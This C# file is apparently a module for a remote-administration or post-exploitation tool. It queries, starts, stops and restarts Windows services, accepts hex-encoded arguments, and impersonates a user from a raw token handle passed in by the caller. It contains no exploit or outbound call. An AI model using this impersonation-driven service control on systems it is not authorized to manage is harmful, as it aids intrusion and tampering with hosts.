using System;
using System.IO;
using System.Text;
using System.Security;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Security.Principal;

using System.ServiceProcess;
using Microsoft.Win32;


public class Module_sc
{
    public const string SUCC_CODE       = "0";
    public const string ERR_CODE        = "1";
    public const string NON_TOKEN_VALUE = "0";

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    private void ImpersonateWithToken(string token)
    {
        int token_int = Int32.Parse(token);
        IntPtr targetToken = new IntPtr(token_int);

        string current_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            current_username = wid.Name;
        }

        if (!ImpersonateLoggedOnUser(targetToken))
        {
            var errorCode = Marshal.GetLastWin32Error();
            throw new Exception("ImpersonateLoggedOnUser failed with the following error: " + errorCode);
        }

        string impersonate_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            impersonate_username = wid.Name;
        }

        if (current_username == impersonate_username)
            throw new Exception("ImpersonateLoggedOnUser worked, but thread running as user " + current_username);
    }

    private string hex2Str(string hex)
    {
        byte[] raw = new byte[hex.Length / 2];
        for (int i = 0; i < raw.Length; i++)
        {
            raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        }
        return Encoding.ASCII.GetString(raw);
    }

    private string normalizePath(string currPath)
    {
        currPath = currPath.Replace("\"", "");
        currPath = currPath.Replace("'", "");
        currPath = currPath.Replace(@"\", "/");
        return currPath;
    }

    private string changeCWD(string cwd)
    {
        try
        {
            Directory.SetCurrentDirectory(cwd);
            return normalizePath(Directory.GetCurrentDirectory());
        }
        catch (Exception ex)
        {
            if (ex is IOException)
                throw new Exception("Path '" + cwd + "' is not a directory");
            else if (ex is DirectoryNotFoundException)
                throw new Exception("Directory '" + cwd + "' does not exist");
            else if (ex is SecurityException)
                throw new Exception("Directory '" + cwd + "' permission denied");
            else if (ex is PathTooLongException)
                throw new Exception("Path '" + cwd + "' exceed the maximum length defined by the system");
            else
                throw new Exception("Move to path '" + cwd + "' failed");
        }
    }

    private string[] parseArguments(string args)
    {
        List<string> arguments_parsed = new List<string>();
        string pattern = @"""[^""]+""|'[^']+'|\S+";
        foreach (Match m in Regex.Matches(args, pattern))
        {
            arguments_parsed.Add(m.Value);
        }
        return arguments_parsed.ToArray();
    }

    private string printService(ServiceController scService)
    {
        string result  = "";
        result += scService.ServiceName + "\t";

        if ((scService.ServiceType & ServiceType.Adapter) != 0)
            result += "Adapter" + "\t";
        else if ((scService.ServiceType & ServiceType.FileSystemDriver) != 0)
            result += "FileSystemDriver" + "\t";
        else if ((scService.ServiceType & ServiceType.InteractiveProcess) != 0)
            result += "InteractiveProcess" + "\t";
        else if ((scService.ServiceType & ServiceType.KernelDriver) != 0)
            result += "KernelDriver" + "\t";
        else if ((scService.ServiceType & ServiceType.RecognizerDriver) != 0)
            result += "RecognizerDriver" + "\t";
        else if ((scService.ServiceType & ServiceType.Win32OwnProcess) != 0)
            result += "Win32OwnProcess" + "\t";
        else if ((scService.ServiceType & ServiceType.Win32ShareProcess) != 0)
            result += "Win32ShareProcess" + "\t";
        
        result += scService.Status.ToString() + "\t";

        string scRegKey = @"SYSTEM\CurrentControlSet\Services\" +  scService.ServiceName;
        RegistryKey rkey = Registry.LocalMachine.OpenSubKey(scRegKey);
        result += rkey.GetValue("ImagePath").ToString() + "\t";

        result += scService.DisplayName + "\t";

        result += ((scService.CanPauseAndContinue) ? "1" : "0") + "\t";
        result += ((scService.CanStop) ? "1" : "0") + "\t";
        result += ((scService.CanShutdown) ? "1" : "0");
        return result;
    }

    private string[] doManageServices(string serviceName, string action)
    {
        try
        {
            try
            {
                ServiceController scService = new ServiceController(serviceName);
                if (action == "start")
                {
                    scService.Start();
                }
                else if (action == "stop")
                {
                    scService.Stop();
                }
                else if (action == "restart")
                {
                    scService.Stop();
                    scService.Start();
                }

                return dolistServices(serviceName);
            }
            catch(InvalidOperationException e)
            {
                throw new Exception(e.ToString());
            }
        }
        catch(Exception ex)
        {
            return new string[]{ERR_CODE, ex.ToString() + Environment.NewLine};
        }
    }

    private string[] dolistServices(string serviceName)
    {
        string result = "Name\tType\tStatus\tImagePath\tDisplayName\tCanPause\tCanStop\tCanShutdown" + Environment.NewLine;

        try
        {
            if (serviceName == "")
            {
                ServiceController[] scServices = ServiceController.GetServices();

                foreach (ServiceController scService in scServices)
                {
                    result += printService(scService);
                    result += Environment.NewLine;
                }
            }
            else
            {
                try
                {
                    ServiceController scService = new ServiceController(serviceName);
                    result += printService(scService);
                    result += Environment.NewLine;
                }
                catch(InvalidOperationException e)
                {
                    throw new Exception("Service: '" + serviceName + "' not found in computer");
                }
            }
        }
        catch(Exception ex)
        {
            result += ex.ToString() + Environment.NewLine;
            return new string[]{ERR_CODE, result};
        }

        return new string[]{SUCC_CODE, result};
    }

    public string[] execute(string[] args)
    {
        string result = "";
        List<string> nargs = new List<string>(args);
		
        if (nargs.Count == 0)
        {
            result = "Invalid arguments provided. Specify an action to perform.";
            return new string[]{ERR_CODE, result};
        }

        string action = nargs[0];
        switch (action)
        {
            case "query":
                if (nargs.Count == 1)
                    return dolistServices("");
                else
                    return dolistServices(nargs[1]);
            case "start":
            case "stop":
            case "restart":
                if (nargs.Count != 2)
                    return new string[]{ERR_CODE, "Service name is missing"};
                else
                    return doManageServices(nargs[1], action);
            default:
                return new string[]{ERR_CODE, "Invalid action"};
        }
    }

    public string[] go(string cwd, string args, string token)
    {
        string[] results = new string[]{SUCC_CODE, ""};
        string pwd = Directory.GetCurrentDirectory();

        try
        {
            if (token != NON_TOKEN_VALUE)
                ImpersonateWithToken(token);

            string new_cwd = changeCWD(cwd);
            string[] arguments_parsed = parseArguments(hex2Str(args));
            
            results = execute(arguments_parsed);
        }
        catch (Exception ex)
        {
            results[0] = ERR_CODE;
            results[1] = ex.ToString();
        }
        finally
        {
            changeCWD(pwd);
            if (token != NON_TOKEN_VALUE)
                RevertToSelf();
        }
        return results;
    }

    public static void Main(string[] args)
    {
        Module_sc m = new Module_sc();
        String[] results = m.execute(args);
        Console.WriteLine(results[0]);
        Console.WriteLine(results[1]);
        return;
    }
}